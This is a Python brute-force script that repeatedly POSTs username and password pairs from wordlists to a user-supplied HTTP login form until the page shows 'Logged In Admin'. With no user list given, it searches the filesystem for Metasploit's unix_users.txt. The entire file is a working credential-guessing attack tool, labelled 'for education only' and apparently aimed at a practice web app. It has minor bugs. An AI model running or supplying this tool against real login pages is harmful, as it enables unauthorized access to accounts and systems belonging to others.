#!/usr/bin/env python3

# Name : Simple Bruteforce v.1.0
# Author: m3talm3rg3
#
# have a bug? report to violentrevolution.12@gmail.com
#
# Note : This tool for education only.
# Dont change author name !

#Basic script for BruteForce on HTTP forms
import requests, sys, http.client, time, glob, os,re,urllib
from tqdm import tqdm
## COLORS ###############
wi="\033[1;37m" #>>White#
rd="\033[1;31m" #>Red   #
gr="\033[1;32m" #>Green #
yl="\033[1;33m" #>Yellow#
pr='\u001b[36m' #>Azul#
bl = "\033[1m"  #>Blond#
Lpr = "\033[1;35m" #light purple#
Lrd = "\033[1;31m"
mg ="\u001b[220m." #>Magneta#
#########################
print(mg +bl+"\n\n############### By M3talm3rg3 \########################\n\n")

txtUser = ''
url = input(Lpr+ bl+"Insert your url: ")
filepass = input(Lpr+bl+"Insert your name of file for passwords: ")
usernames =input(Lpr+bl+"Insert your file of your usernames (default username_unix.txt/metasploit): ")


####FUncion para Buscar el arhcivo de usernames unix 
def list_files(filepath, filetype):
   paths = []
   for root, dirs, files in os.walk(filepath):
      for file in files:
         if file.lower().endswith(filetype.lower()):
	            paths.append(os.path.join(root, file))
   return(paths)

#funcion para hacer el brute force por medio de un txt en la respuesta del server
def bruteforce(uss):
	with open(txtUser.join(uss),'r') as u:
		user = u.read().split()
		print(rd + bl +"[*] Starting attack ...")
		for us in user:
			with open(filepass,'r') as p:
				ps = p.read().split()
				for psw in ps:
					pLogin = "Login"
					data ={'username': us ,'password': psw, "login-php-submit-button":"Login"}
					r = requests.post(url,data = data)
					print(wi + "Contenido respuesta: ", r.status_code)
					if ("Logged In Admin") in r.text:
						print(yl+bl+"[*] Credentials found ... :"+pr+bl+ " [+] User: " + us + " [+] Password: " + psw  )
						sys.exit()
					else:
						 print(rd+ "[-] Credentials not found "+yl )
######################################################################################

if(url == "" or filepass ==""):
	print(Lrd + "insert your options")
else:
	user = ''
	if (usernames ==""):
		usern = list_files('/','unix_users.txt')
		usernames =usern
	else:
		usernames = usernames
	print(yl +"[*] Working ...... ")
	bruteforce(usernames)
